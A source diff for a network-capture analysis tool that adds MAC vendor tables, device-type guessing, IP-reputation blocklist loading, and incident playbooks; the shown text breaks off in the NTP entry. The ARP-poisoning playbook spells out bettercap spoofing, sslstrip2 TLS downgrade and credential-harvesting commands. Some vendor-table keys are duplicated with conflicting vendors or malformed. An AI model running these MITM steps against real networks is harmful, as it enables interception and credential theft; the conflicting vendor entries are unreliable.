@@ -61,14 +61,539 @@ except Exception:
     IPv6 = None
     ICMPv6ND_RA = None
 try:
-    from scapy.layers.dns import DNS
+    from scapy.layers.dns import DNS, DNSRR, DNSQR
 except Exception:
     DNS = None
+    DNSRR = None
+    DNSQR = None
+try:
+    from scapy.layers.dhcp import BOOTP, DHCP
+except Exception:
+    BOOTP = None
+    DHCP = None
 try:
     from ipwhois import IPWhois
     HAS_IPWHOIS = True
 except ImportError:
     HAS_IPWHOIS = False
+
+
+# ---------------------------------------------------------------------------
+# Device identity: OUI vendor lookup, hostname extraction, device-type guess.
+# All offline. Wireshark's manuf overrides the embedded table when present.
+# ---------------------------------------------------------------------------
+
+# Embedded OUI table (first 6 hex chars of MAC, lowercase, no separators).
+# Curated for common LAN gear; manuf file gives the long tail.
+OUI_VENDORS = {
+    # Apple
+    "000393": "Apple", "001124": "Apple", "001451": "Apple", "0017f2": "Apple",
+    "001b63": "Apple", "001d4f": "Apple", "001ef3": "Apple", "001ff3": "Apple",
+    "002241": "Apple", "0023df": "Apple", "0024d7": "Apple", "0025bc": "Apple",
+    "00264a": "Apple", "0026b0": "Apple", "0026bb": "Apple", "08e689": "Apple",
+    "10ddb1": "Apple", "1c1ac0": "Apple", "28cfe9": "Apple", "34159e": "Apple",
+    "3c0754": "Apple", "3c2eff": "Apple", "40331a": "Apple", "488ad2": "Apple",
+    "4c8d79": "Apple", "5cf938": "Apple", "60334b": "Apple", "68a86d": "Apple",
+    "6c7e67": "Apple", "70cd60": "Apple", "78fd94": "Apple", "7c6d62": "Apple",
+    "80929f": "Apple", "885395": "Apple", "8c2937": "Apple", "98d6f7": "Apple",
+    "a45e60": "Apple", "a4d18c": "Apple", "ace4b8": "Apple", "b4f0ab": "Apple",
+    "b8634d": "Apple", "b8e856": "Apple", "bc926b": "Apple", "c869cd": "Apple",
+    "d8a25e": "Apple", "dc2b2a": "Apple", "f0dbe2": "Apple",
+    # Microsoft
+    "000d3a": "Microsoft", "0017fa": "Microsoft", "0050f2": "Microsoft",
+    "28183e": "Microsoft", "485073": "Microsoft", "60450b": "Microsoft",
+    "7c1e52": "Microsoft", "98c869": "Microsoft", "c83f26": "Microsoft",
+    # Dell
+    "000bdb": "Dell", "001143": "Dell", "0014c2": "Dell", "0018f3": "Dell",
+    "0021b6": "Dell", "0022d3": "Dell", "002219": "Dell", "00248c": "Dell",
+    "08002b": "Dell", "10604b": "Dell", "1866da": "Dell", "1c1d1d": "Dell",
+    "246e96": "Dell", "3417eb": "Dell", "5cf9dd": "Dell", "b083fe": "Dell",
+    "b44506": "Dell", "b8ca3a": "Dell", "ec22ba": "Dell", "f8b156": "Dell",
+    "f8cab8": "Dell", "f8db88": "Dell",
+    # Cisco
+    "00000c": "Cisco", "000142": "Cisco", "00036b": "Cisco", "0006d6": "Cisco",
+    "000bbe": "Cisco", "000e08": "Cisco", "000e84": "Cisco", "001007": "Cisco",
+    "001bd4": "Cisco", "0021a0": "Cisco", "002255": "Cisco", "00b000": "Cisco",
+    "1cdf0f": "Cisco", "204e7f": "Cisco", "44d3ca": "Cisco", "586d8f": "Cisco",
+    "6c50ad": "Cisco", "881dfc": "Cisco", "a45630": "Cisco", "bc671c": "Cisco",
+    "e8d322": "Cisco", "f0ee10": "Cisco",
+    # HP / Hewlett Packard / HPE / Aruba
+    "001083": "HP", "001321": "HP", "0014c2": "HP", "0017a4": "HP",
+    "001a4b": "HP", "001b78": "HP", "001cc4": "HP", "00237d": "HP",
+    "002655": "HP", "002a10": "HP", "086618": "HPE", "10604b": "HP",
+    "3024a9": "HP", "94ff3c": "HP", "b8af67": "HP",
+    "9c1c12": "Aruba", "94b40f": "Aruba", "ac1f6b": "Aruba",
+    # Intel
+    "001500": "Intel", "001e64": "Intel", "0021cc": "Intel", "001b21": "Intel",
+    "001f3c": "Intel", "1c697a": "Intel", "5c514f": "Intel", "ac675d": "Intel",
+    "c0d4e9": "Intel", "f8632a": "Intel", "fcaa14": "Intel",
+    # Samsung
+    "001632": "Samsung", "0023d6": "Samsung", "002399": "Samsung", "0026e2": "Samsung",
+    "0c1420": "Samsung", "0c8910": "Samsung", "143f9a": "Samsung", "289eda": "Samsung",
+    "2cae2b": "Samsung", "3413e8": "Samsung", "44783e": "Samsung", "5492bf": "Samsung",
+    "78ea50": "Samsung", "8425db": "Samsung", "885a92": "Samsung", "94350a": "Samsung",
+    "a0214c": "Samsung",
+    # Google / Nest / Chromecast / Pixel
+    "0008c7": "Google", "001a11": "Google", "20df0c": "Google", "30fd38": "Google",
+    "4cb858": "Google", "5444a3": "Google", "6466b3": "Google", "847a88": "Google",
+    "9059af": "Google", "94eb2c": "Google", "a4773e": "Google", "f4f5d8": "Google",
+    "f4f5e8": "Google",
+    "18b430": "Nest", "64169c": "Nest",
+    # Amazon (Echo, Fire, Ring)
+    "001de1": "Amazon", "00fc8b": "Amazon", "041bc7": "Amazon", "0c47c9": "Amazon",
+    "1841a7": "Amazon", "34d270": "Amazon", "40b4cd": "Amazon", "44650d": "Amazon",
+    "50f5da": "Amazon", "5c41e7": "Amazon", "68dbf5": "Amazon", "747548": "Amazon",
+    "7ce441": "Amazon", "84d6d0": "Amazon", "881fa1": "Amazon", "a002dc": "Amazon",
+    "ac63be": "Amazon", "b4f1da": "Amazon", "b85ee1": "Amazon", "f0d2f1": "Amazon",
+    "f0f0a4": "Amazon", "fc65de": "Amazon",
+    # Roku
+    "002a3c": "Roku", "00f0d4": "Roku", "08056d": "Roku", "0c5f35": "Roku",
+    "20fe83": "Roku", "2c83cd": "Roku", "5c497b": "Roku", "8052ed": "Roku",
+    "b0a737": "Roku", "ac3a7a": "Roku", "b83e59": "Roku", "c83a35": "Roku",
+    "cca12b": "Roku", "d8311c": "Roku", "d83134": "Roku", "dc3a5e": "Roku",
+    # Sonos
+    "000e58": "Sonos", "5caafd": "Sonos", "78282a": "Sonos", "94f8e0": "Sonos",
+    "9c5cf9": "Sonos", "b8e937": "Sonos",
+    # LG
+    "00059a": "LG", "001fe3": "LG", "001f6b": "LG", "00259e": "LG",
+    "0026e2": "LG", "10683f": "LG", "344df7": "LG", "382c4a": "LG",
+    "58a2b5": "LG", "84a466": "LG", "94e90f": "LG", "98d6bb": "LG",
+    "ac0d1b": "LG", "b8ad3e": "LG", "c80210": "LG", "f8a9d0": "LG",
+    # Sony / PlayStation
+    "0013a9": "Sony", "001a80": "Sony", "001dba": "Sony", "0024bf": "Sony",
+    "00257b": "Sony", "2c8158": "Sony", "30f31d": "Sony", "54420e": "Sony",
+    "5c4327": "Sony", "780489": "Sony", "8400d2": "Sony", "9803d8": "Sony",
+    "ac9b84": "Sony", "fcf152": "Sony",
+    # Nintendo
+    "0009bf": "Nintendo", "001656": "Nintendo", "0017ab": "Nintendo", "0019fd": "Nintendo",
+    "001bea": "Nintendo", "001cbe": "Nintendo", "001ddc": "Nintendo", "001e35": "Nintendo",
+    "001f32": "Nintendo", "002709": "Nintendo", "0403d6": "Nintendo", "182a7b": "Nintendo",
+    "344aa4": "Nintendo", "40d28a": "Nintendo", "582f40": "Nintendo", "606bff": "Nintendo",
+    "78a2a0": "Nintendo", "7c5cf8": "Nintendo", "8418fb": "Nintendo", "8c56c5": "Nintendo",
+    "98b6e9": "Nintendo", "98e8fa": "Nintendo", "a45c27": "Nintendo", "b88aec": "Nintendo",
+    "cc9e00": "Nintendo", "ccfb65": "Nintendo", "e84ece": "Nintendo",
+    # Telco / STB / Mesh OEMs
+    "d4351d": "Technicolor",         # Technicolor Delivery (Telus/Bell STB + Wi-Fi)
+    "54b7bd": "Hon Hai",              # Foxconn — many STB carriers
+    "001d6a": "Hon Hai", "00188b": "Hon Hai",
+    "002339": "Hon Hai", "1c66aa": "Hon Hai",
+    "34194d": "Hitron",               # Hitron Technologies (cable modems / gateways)
+    "002545": "Hitron", "684a76": "Hitron", "841b5e": "Hitron",
+    "ccf735": "Sercomm",              # Telus mesh / set-top
+    "001736": "Sercomm", "005026": "Sercomm",
+    "283926": "Quantenna",            # Wi-Fi chipset, common in STB radios
+    "001ee5": "ARRIS",                # ARRIS modems / STB
+    "0010a4": "ARRIS", "00257f": "ARRIS",
+    "2c302c": "ARRIS", "ac8e07": "ARRIS",
+    "002354": "Pace",                 # Pace STB (now Arris)
+    "001a79": "AirTies",              # Mesh AP OEM
+    "001550": "Zenterio",             # ZIDS_OUI=9855 (Zenterio-derived STB sticker)
+    # Routers / SOHO networking
+    "001a2b": "TP-Link", "001fc6": "TP-Link", "10feed": "TP-Link", "14cc20": "TP-Link",
+    "1c61b4": "TP-Link", "3460f9": "TP-Link", "40169f": "TP-Link", "48a6b8": "TP-Link",
+    "5c628b": "TP-Link", "6466b3": "TP-Link", "747295": "TP-Link", "98ded0": "TP-Link",
+    "a42bb0": "TP-Link", "c4e90a": "TP-Link", "ec086b": "TP-Link", "f0f249": "TP-Link",
+    "001346": "Netgear", "001b2f": "TP-Link", "001e2a": "Netgear", "001f33": "Netgear",
+    "002624": "Netgear", "04a151": "Netgear", "08bd43": "Netgear", "10da43": "Netgear",
+    "20e52a": "Netgear", "44a56e": "Netgear", "6cb0ce": "Netgear", "9c3dcf": "Netgear",
+    "001a70": "Linksys", "0023694": "Linksys", "002692": "Linksys", "60381f": "Linksys",
+    "98fc11": "Linksys", "c0c1c0": "Linksys",
+    "0015e9": "D-Link", "001b11": "D-Link", "001cf0": "D-Link", "001e58": "D-Link",
+    "002191": "D-Link", "00226b": "D-Link", "002401": "D-Link", "0024a5": "D-Link",
+    "002618": "D-Link", "1cbdb9": "D-Link", "5cd998": "D-Link", "84c9b2": "D-Link",
+    "002354": "ASUS", "001632": "ASUS", "002154": "ASUS", "1c872c": "ASUS",
+    "381a52": "ASUS", "40167e": "ASUS", "48eb22": "ASUS", "5404a6": "ASUS",
+    "60a44c": "ASUS", "704d7b": "ASUS", "ac220b": "ASUS", "bcaec5": "ASUS",
+    "fc3497": "Ubiquiti", "0418d6": "Ubiquiti", "245a4c": "Ubiquiti", "44d9e7": "Ubiquiti",
+    "687251": "Ubiquiti", "74acb9": "Ubiquiti", "78a4c5": "Ubiquiti", "802aa8": "Ubiquiti",
+    "f09fc2": "Ubiquiti", "f492bf": "Ubiquiti", "fcecda": "Ubiquiti",
+    "4c5e0c": "MikroTik", "6c3b6b": "MikroTik", "b869f4": "MikroTik",
+    "00237b": "MikroTik", "08552c": "MikroTik", "2cc81b": "MikroTik",
+    # IoT / SBC / chipset
+    "b827eb": "Raspberry Pi", "dca632": "Raspberry Pi", "e45f01": "Raspberry Pi",
+    "2cf432": "Raspberry Pi", "d83add": "Raspberry Pi",
+    "5ccf7f": "Espressif (ESP)", "240ac4": "Espressif (ESP)", "30aea4": "Espressif (ESP)",
+    "84f3eb": "Espressif (ESP)", "a020a6": "Espressif (ESP)", "bcddc2": "Espressif (ESP)",
+    "ecfabc": "Espressif (ESP)",
+    # Phones / handset OEMs
+    "0023a7": "Huawei", "0023f4": "Huawei", "002568": "Huawei", "002eea": "Huawei",
+    "0046f0": "Huawei", "1cab01": "Huawei", "2c5bb8": "Huawei", "44a191": "Huawei",
+    "48ad08": "Huawei", "60d8ac": "Huawei", "84a8e4": "Huawei", "98e7f5": "Huawei",
+    "001ef8": "Xiaomi", "0c1dc2": "Xiaomi", "1c2e57": "Xiaomi", "286c07": "Xiaomi",
+    "346895": "Xiaomi", "4c34f8": "Xiaomi", "5440ad": "Xiaomi", "780bce": "Xiaomi",
+    "8cbeac": "Xiaomi", "98fa9b": "Xiaomi", "a02693": "Xiaomi", "fc6473": "Xiaomi",
+    # Printers
+    "001a4d": "Brother", "008092": "Brother", "30055c": "Brother",
+    "001b32": "Canon", "00bbc1": "Canon", "043f72": "Canon",
+    "08006e": "Epson", "00a7bd": "Epson", "30cda7": "Epson",
+    "0023fb": "Konica Minolta",
+    # NAS
+    "001132": "Synology", "0011327": "Synology", "0024fe": "AVM (Fritzbox)",
+    "001ddf": "QNAP", "0040ca": "QNAP", "245ebe": "QNAP",
+    # VoIP
+    "000fcc": "Polycom", "0090f8": "Polycom",
+    "0017ff": "Snom", "0024ae": "Snom",
+    "001565": "Yealink", "805ec0": "Yealink",
+    # Hypervisor / virtual
+    "000c29": "VMware", "001c14": "VMware", "005056": "VMware", "001569": "VMware",
+    "080027": "VirtualBox", "525400": "QEMU/KVM",
+    "0003ff": "Hyper-V", "00155d": "Hyper-V",
+    "001876": "Parallels", "001c42": "Parallels", "00163e": "Xen",
+}
+
+_MANUF_PATHS = [
+    "/usr/share/wireshark/manuf",
+    "/opt/wireshark/manuf",
+    "/usr/local/share/wireshark/manuf",
+]
+_manuf_cache = None  # dict mapping 6-hex prefix -> (short, long)
+
+
+def _load_manuf():
+    """Load Wireshark's manuf file once. Returns dict or {} if not found."""
+    global _manuf_cache
+    if _manuf_cache is not None:
+        return _manuf_cache
+    _manuf_cache = {}
+    for path in _MANUF_PATHS:
+        if not os.path.exists(path):
+            continue
+        try:
+            with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    line = line.split("#", 1)[0].strip()
+                    if not line:
+                        continue
+                    parts = re.split(r"\s+", line, maxsplit=2)
+                    if len(parts) < 2:
+                        continue
+                    mac_part = parts[0]
+                    # Only handle 24-bit OUIs for now; ignore the longer (28/36-bit) ranges.
+                    if "/" in mac_part:
+                        continue
+                    macnorm = mac_part.replace(":", "").replace("-", "").lower()
+                    if len(macnorm) < 6:
+                        continue
+                    key = macnorm[:6]
+                    short = parts[1]
+                    long_ = parts[2] if len(parts) >= 3 else short
+                    _manuf_cache[key] = (short, long_)
+            break  # first match wins
+        except Exception:
+            continue
+    return _manuf_cache
+
+
+def lookup_vendor(mac):
+    """Best-effort vendor name for a MAC. None if unknown / invalid."""
+    if not mac:
+        return None
+    m = mac.lower().replace(":", "").replace("-", "")
+    if len(m) < 6:
+        return None
+    # Locally-administered MACs (2nd hex bit of first octet set) are randomized;
+    # don't claim a vendor for them — they're per-association MACs (Wi-Fi privacy).
+    try:
+        first = int(m[:2], 16)
+        if first & 0x02:
+            return "(randomized MAC)"
+    except Exception:
+        pass
+    prefix = m[:6]
+    manuf = _load_manuf()
+    if prefix in manuf:
+        short, long_ = manuf[prefix]
+        # Prefer the "long" name if it's not a numeric placeholder.
+        return long_ if long_ and not long_.startswith("0x") else short
+    return OUI_VENDORS.get(prefix)
+
+
+# Vendor → likely device-class hint (only fires when ports/proto don't tell us more).
+_VENDOR_CLASS = {
+    "Apple": "apple-device", "Samsung": "phone-or-tv", "Google": "google-device",
+    "Amazon": "echo-or-fire", "Roku": "stb", "Sonos": "speaker", "Nest": "iot",
+    "LG": "tv-or-appliance", "Sony": "tv-or-console", "Nintendo": "console",
+    "Technicolor": "stb-or-gateway", "Hitron": "modem-gateway",
+    "ARRIS": "modem-gateway", "Pace": "stb", "Sercomm": "stb-or-mesh",
+    "Quantenna": "wifi-radio", "Zenterio": "stb", "AirTies": "mesh-ap",
+    "Aruba": "ap-or-switch", "Cisco": "router-or-switch", "Ubiquiti": "router-or-ap",
+    "MikroTik": "router", "TP-Link": "router-or-ap", "Netgear": "router-or-ap",
+    "Linksys": "router-or-ap", "D-Link": "router-or-ap", "ASUS": "pc-or-router",
+    "Brother": "printer", "Canon": "printer", "Epson": "printer",
+    "Konica Minolta": "printer",
+    "Polycom": "voip", "Snom": "voip", "Yealink": "voip",
+    "Raspberry Pi": "sbc", "Espressif (ESP)": "iot",
+    "Synology": "nas", "QNAP": "nas",
+    "Hon Hai": "consumer-electronics",
+    "Huawei": "phone-or-router", "Xiaomi": "phone-or-iot",
+    "Microsoft": "windows-pc", "Dell": "pc-or-server", "HP": "pc-printer-or-server",
+    "Intel": "pc-or-nic", "Lenovo": "pc",
+    "VMware": "virtual-host", "VirtualBox": "virtual-host",
+    "QEMU/KVM": "virtual-host", "Hyper-V": "virtual-host",
+}
+
+# UPnP friendly types we recognize in SSDP Server strings → device-type guess.
+_SSDP_TYPE_HINTS = [
+    (re.compile(r"miniupnpd|InternetGatewayDevice|WANIPConnection", re.I), "router"),
+    (re.compile(r"Cloudcheck|WANConnection|WANDevice", re.I), "router-or-mesh"),
+    (re.compile(r"dial-multiscreen|MediaRenderer|MediaServer|zss/", re.I), "stb"),
+    (re.compile(r"tvdevice|TV/|Smart TV", re.I), "tv"),
+    (re.compile(r"sonos|MediaServer:1.*sonos", re.I), "speaker"),
+    (re.compile(r"WFADevice|WFAWLANConfig", re.I), "wifi-ap"),
+    (re.compile(r"Roku|RokuBox", re.I), "stb"),
+    (re.compile(r"Camera|IPCamera|Hikvision|Dahua", re.I), "camera"),
+    (re.compile(r"Printer", re.I), "printer"),
+]
+
+
+def infer_device_type(host):
+    """Best-effort device-type label using SSDP / DHCP / ports / vendor."""
+    # 1. SSDP Server string is the strongest signal.
+    srv = host.get("ssdp_server") or ""
+    for rx, lab in _SSDP_TYPE_HINTS:
+        if rx.search(srv):
+            return lab
+
+    # 2. DHCP vendor-class id from the client itself.
+    dvc = (host.get("dhcp_vendor_class") or "").lower()
+    if dvc:
+        if "quantenna" in dvc: return "wifi-radio"
+        if "msft" in dvc:      return "windows-pc"
+        if "android" in dvc:   return "phone-android"
+        if "ios" in dvc or "iphone" in dvc or "ipad" in dvc: return "phone-ios"
+        if "udhcp" in dvc:     return "embedded-linux"
+        if "dhcpcd" in dvc:    return "linux"
+        if "ciscovoip" in dvc or "yealink" in dvc or "polycom" in dvc: return "voip"
+        if "broadbandforum" in dvc or "stb" in dvc or "uiw" in dvc: return "stb"
+
+    # 3. Port-based heuristics on listening ports.
+    listening = host.get("ports_listening") or set()
+    if 9100 in listening: return "printer"            # raw RAW print
+    if 631 in listening:  return "printer"            # IPP
+    if 5060 in listening or 5061 in listening: return "voip"
+    if 1883 in listening or 8883 in listening: return "iot-mqtt"
+    if 502 in listening:  return "ics-modbus"
+    if 102 in listening:  return "ics-siemens"
+    if 47808 in listening: return "ics-bacnet"
+    if 8009 in listening: return "chromecast"
+    if 3389 in listening: return "windows-pc"
+    if 5985 in listening or 5986 in listening: return "windows-server"
+    if 22 in listening and 80 in listening and 443 in listening:
+        return "linux-server"
+    if 8080 in listening and 80 in listening and 443 in listening:
+        # SPA admin UI with a redirect → likely a managed gateway/STB box
+        return "embedded-admin-ui"
+    if 53 in listening:   return "dns-or-router"
+    if 67 in listening:   return "dhcp-server"
+
+    # 4. Vendor fallback.
+    v = host.get("vendor")
+    if v and v in _VENDOR_CLASS:
+        return _VENDOR_CLASS[v]
+    return None
+
+
+# ---------------------------------------------------------------------------
+# IP-reputation feeds — offline aggregated blocklists, no API key required.
+# Downloads ~10 public lists (FireHOL meta-feeds, Spamhaus DROP, ET, Abuse.ch,
+# CINS, DShield, Blocklist.de, Tor exits) once per 24 h and caches under
+# ~/.cache/deadfall/feeds/. Lookups are O(1) for exact IPs and a single linear
+# scan over precomputed (net_int, mask_int) tuples for CIDRs.
+# ---------------------------------------------------------------------------
+
+REP_FEEDS = [
+    # (name, url, kind='ip'|'cidr', tag)
+    ("firehol-level1", "https://iplists.firehol.org/files/firehol_level1.netset", "cidr", "FireHOL L1"),
+    ("firehol-level2", "https://iplists.firehol.org/files/firehol_level2.netset", "cidr", "FireHOL L2"),
+    ("et-compromised", "https://rules.emergingthreats.net/blockrules/compromised-ips.txt", "ip", "ET compromised"),
+    ("spamhaus-drop",  "https://www.spamhaus.org/drop/drop.txt", "cidr", "Spamhaus DROP"),
+    ("spamhaus-edrop", "https://www.spamhaus.org/drop/edrop.txt", "cidr", "Spamhaus EDROP"),
+    ("feodotracker",   "https://feodotracker.abuse.ch/downloads/ipblocklist.txt", "ip", "Feodo C2"),
+    ("blocklist-de",   "https://lists.blocklist.de/lists/all.txt", "ip", "blocklist.de"),
+    ("cins-army",      "https://cinsscore.com/list/ci-badguys.txt", "ip", "CINS bad"),
+    ("tor-exits",      "https://check.torproject.org/torbulkexitlist", "ip", "Tor exit"),
+]
+
+# Tor exit is informational, not "malicious" per se — separated so the UI can downrank it.
+INFO_ONLY_FEEDS = {"Tor exit"}
+
+
+def _ip_to_int(ip_str):
+    try:
+        parts = ip_str.split(".")
+        if len(parts) != 4:
+            return None
+        return ((int(parts[0]) << 24) | (int(parts[1]) << 16) |
+                (int(parts[2]) << 8)  |  int(parts[3]))
+    except Exception:
+        return None
+
+
+def _cidr_to_net_mask(cidr):
+    """ '198.51.100.0/24'  ->  (net_int, mask_int).  None on parse error / IPv6."""
+    try:
+        if "/" in cidr:
+            net, bits = cidr.split("/", 1)
+            bits = int(bits)
+        else:
+            net, bits = cidr, 32
+        if bits < 0 or bits > 32:
+            return None
+        n = _ip_to_int(net)
+        if n is None:
+            return None
+        mask = 0xFFFFFFFF if bits == 32 else ((0xFFFFFFFF << (32 - bits)) & 0xFFFFFFFF)
+        return (n & mask, mask)
+    except Exception:
+        return None
+
+
+class ReputationFeeds:
+    """Background-loaded aggregator over public IP blocklists."""
+
+    REFRESH_SECONDS = 24 * 3600
+    DOWNLOAD_TIMEOUT = 20
+
+    def __init__(self, cache_dir=None, enabled=True):
+        self.cache_dir = os.path.expanduser(cache_dir or "~/.cache/deadfall/feeds")
+        self.enabled = enabled
+        self.ip_index = {}        # "1.2.3.4" -> set(tag)
+        self.cidr_list = []       # list of (net_int, mask_int, tag)
+        self.feed_stats = {}      # name -> {tag, count, source, error}
+        self.ready = threading.Event()
+        self.lock = threading.Lock()
+        if not self.enabled:
+            self.ready.set()
+            return
+        try:
+            os.makedirs(self.cache_dir, exist_ok=True)
+        except Exception:
+            # If we can't write cache, run in download-only memory mode.
+            self.cache_dir = tempfile.mkdtemp(prefix="deadfall-feeds-")
+        threading.Thread(target=self._load_all, daemon=True, name="feeds-loader").start()
+
+    # -------- loader --------
+    def _load_all(self):
+        for name, url, kind, tag in REP_FEEDS:
+            self._load_one(name, url, kind, tag)
+        with self.lock:
+            ip_n = len(self.ip_index)
+            cidr_n = len(self.cidr_list)
+        print(f"[*] reputation feeds loaded: {ip_n:,} IPs + {cidr_n:,} CIDRs across {len(self.feed_stats)} feeds",
+              file=sys.stderr, flush=True)
+        self.ready.set()
+
+    def _load_one(self, name, url, kind, tag):
+        cache_path = os.path.join(self.cache_dir, name + ".txt")
+        text = None
+        source = None
+        # Use cache if fresh.
+        try:
+            if os.path.exists(cache_path):
+                age = time.time() - os.path.getmtime(cache_path)
+                if age < self.REFRESH_SECONDS:
+                    with open(cache_path, "r", encoding="utf-8", errors="ignore") as f:
+                        text = f.read()
+                    source = "cache"
+        except Exception:
+            pass
+        if text is None:
+            try:
+                import urllib.request, ssl
+                ctx = ssl.create_default_context()
+                req = urllib.request.Request(url, headers={"User-Agent": "Deadfall-Reputation/1.0"})
+                with urllib.request.urlopen(req, timeout=self.DOWNLOAD_TIMEOUT, context=ctx) as r:
+                    text = r.read().decode("utf-8", errors="ignore")
+                source = "fresh"
+                try:
+                    with open(cache_path, "w", encoding="utf-8") as f:
+                        f.write(text)
+                except Exception:
+                    pass
+            except Exception as e:
+                # Last-resort fallback to a stale cache.
+                if os.path.exists(cache_path):
+                    try:
+                        with open(cache_path, "r", encoding="utf-8", errors="ignore") as f:
+                            text = f.read()
+                        source = "stale"
+                    except Exception:
+                        text = None
+                if text is None:
+                    self.feed_stats[name] = {"tag": tag, "count": 0, "source": None, "error": str(e)[:120]}
+                    return
+        # Parse.
+        count = 0
+        added_ip = self.ip_index
+        added_cidr = self.cidr_list
+        with self.lock:
+            for line in text.splitlines():
+                line = line.strip()
+                if not line or line.startswith("#") or line.startswith(";") or line.startswith("//"):
+                    continue
+                # Many feeds have trailing comments after whitespace.
+                token = line.split()[0].split(";", 1)[0].strip()
+                if not token:
+                    continue
+                if kind == "ip" and "/" not in token:
+                    # Plain dotted-quad.
+                    if _ip_to_int(token) is None:
+                        continue
+                    s = added_ip.setdefault(token, set())
+                    if tag not in s:
+                        s.add(tag)
+                        count += 1
+                elif kind == "cidr" or "/" in token:
+                    nm = _cidr_to_net_mask(token)
+                    if nm is None:
+                        continue
+                    net, mask = nm
+                    if mask == 0xFFFFFFFF:
+                        # /32 — index as exact IP for the fast path.
+                        ip_str = ".".join(str((net >> (8*(3-i))) & 0xFF) for i in range(4))
+                        s = added_ip.setdefault(ip_str, set())
+                        if tag not in s:
+                            s.add(tag)
+                            count += 1
+                    else:
+                        added_cidr.append((net, mask, tag))
+                        count += 1
+        self.feed_stats[name] = {"tag": tag, "count": count, "source": source, "error": None}
+
+    # -------- lookup --------
+    def lookup(self, ip_str):
+        """Return list of feed-tags this IP appears on, or []."""
+        if not self.ready.is_set():
+            return []
+        tags = set()
+        with self.lock:
+            exact = self.ip_index.get(ip_str)
+            if exact:
+                tags.update(exact)
+            n = _ip_to_int(ip_str)
+            if n is not None:
+                for net, mask, tag in self.cidr_list:
+                    if (n & mask) == net:
+                        tags.add(tag)
+        return sorted(tags)
+
+    def is_malicious(self, tags):
+        return any(t not in INFO_ONLY_FEEDS for t in tags)
+
+
+# Module-level singleton; the worker starts immediately so feeds are ready by
+# the time the user opens the UI.
+reputation_feeds = ReputationFeeds()
+
+
+def pick_hostname(host):
+    """Pick the best hostname from all the sources we collected."""
+    return (host.get("dhcp_hostname")
+            or host.get("nbns_name")
+            or host.get("mdns_local_name")
+            or host.get("ssdp_friendly_name")
+            or host.get("rdns_name")
+            or None)
 
 
 PLAINTEXT_PORTS = {
@@ -950,6 +1475,1416 @@ ATTACK_PATHS = [
         ],
         "tools": ["VirusTotal", "winpmem", "Velociraptor", "AVML"],
     },
+    {
+        "id": "arp-poison-mitm",
+        "name": "ARP cache poisoning → man-in-the-middle",
+        "severity": "critical",
+        "phase": "L2",
+        "match_any_category": ["arp-spoof"],
+        "amplifiers": ["cleartext-creds", "plaintext-protocol"],
+        "description": ("Duplicate IP→MAC bindings mean someone is already poisoning the "
+                        "segment, OR you can. With ARP control you become the default gateway "
+                        "for that L2: harvest creds, downgrade TLS, inject responses."),
+        "steps": [
+            "Identify the disputed IP and the two MACs from the finding evidence. The "
+            "legitimate MAC is usually the one observed first; cross-check against the "
+            "switch CAM if you have access.",
+            "If you're the attacker (authorized red-team): "
+            "`bettercap -iface eth0 -caplet http-ui` then `set arp.spoof.targets <victim>; "
+            "set arp.spoof.fullduplex true; arp.spoof on; net.sniff on`.",
+            "Stack with `sslstrip2 + dns2proxy` (or bettercap's hstshijack) to break "
+            "opportunistic TLS on hosts that aren't HSTS-preloaded.",
+            "Collect creds with `bettercap.modules.net.sniff` or pipe to `pcredz`.",
+            "If you're defending: enable Dynamic ARP Inspection (DAI) and DHCP snooping on "
+            "the access switch; static ARP for crown jewels (HSM, vCenter, DCs).",
+        ],
+        "tools": ["bettercap", "ettercap", "arpspoof (dsniff)", "pcredz", "sslstrip2"],
+    },
+    {
+        "id": "dns-tunnel-c2",
+        "name": "DNS tunneling — C2 over DNS or data exfil",
+        "severity": "high",
+        "phase": "incident",
+        "match_any_category": ["dns-tunnel"],
+        "description": ("Long high-entropy subdomains queried against an external resolver "
+                        "are the DNS-C2 / DNS-exfil shape: dnscat2, iodine, Cobalt Strike DNS "
+                        "beacon, Cloak. Isolate the source, identify the beacon shape, then "
+                        "pivot to the destination domain's owner."),
+        "steps": [
+            "From the finding evidence, capture the apex domain (e.g. `evil.com`). "
+            "All children of that domain are part of the same channel.",
+            "Pull every DNS query from the graph for that domain: "
+            "`tshark -r capture.pcap -Y 'dns.qry.name contains \"evil.com\"' -T fields "
+            "-e dns.qry.name -e ip.src > queries.txt`.",
+            "Determine the tool: dnscat2 uses TXT records with 1-char prefixes; iodine "
+            "uses NULL records; Cobalt Strike uses A records with hex-encoded data.",
+            "Sinkhole the parent domain at the resolver (Response Policy Zone): "
+            "`zone \"evil.com\" { type master; file \"sink.zone\"; };` — return localhost.",
+            "Identify the C2 operator: WHOIS the apex; if it resolves to a CDN, pivot "
+            "via passive DNS (Farsight, RiskIQ, SecurityTrails) to find the origin.",
+            "Re-image the originating host — DNS-C2 implies persistent malware. Memory "
+            "capture before reimage.",
+        ],
+        "tools": ["tshark", "DNSStager (detect)", "RITA", "passive DNS",
+                  "winpmem / AVML"],
+    },
+    {
+        "id": "icmp-c2-isolation",
+        "name": "ICMP tunneling / C2 — isolate compromised host",
+        "severity": "high",
+        "phase": "incident",
+        "match_any_category": ["tunneling"],
+        "description": ("Oversized ICMP echo payloads are the icmpsh / ptunnel / hans / "
+                        "Loki shape. Treat the source host as compromised — ICMP egress was "
+                        "the channel because all the front doors were closed."),
+        "steps": [
+            "Confirm the shape: `tshark -r cap.pcap -Y 'icmp.type==8 && data.len>128' "
+            "-T fields -e ip.src -e ip.dst -e data.len | head`. Repetitive payloads with "
+            "the same first bytes = tunnel header.",
+            "From the source host: live response (process listing, network connections, "
+            "loaded drivers/kexts). The tunnel client is often in /tmp, %APPDATA%, or "
+            "an unusual scheduled task / launchd plist.",
+            "Block ICMP echo egress at the perimeter immediately; size-limit echo to 64 "
+            "bytes if echo must stay enabled for monitoring.",
+            "Pcap the host's outbound while you investigate — once the tunnel dies the "
+            "operator may switch to DNS / HTTPS backup channel.",
+            "Memory-capture before reimage. Rotate any creds the host could touch.",
+        ],
+        "tools": ["tshark", "Velociraptor", "winpmem / AVML", "ptunnel detect"],
+    },
+    {
+        "id": "ntp-amplification-defense",
+        "name": "NTP monlist amplification — confirm exposure",
+        "severity": "medium",
+        "phase": "exposure",
+        "match_any_category": ["amplification"],
+        "description": ("ntpd ≤ 4.2.7p25 with `monlist` enabled is a >500× UDP amplifier. "
+                        "It's also actively scanned for and abused as a reflector. If you "
+                        "see monlist responses leaving your network, either you're running "
+                        "an exposed ntpd or you're being used as a reflector by spoofed src."),
+        "steps": [
+            "Confirm: `ntpdc -n -c monlist <host>` from the outside — if it answers, the "
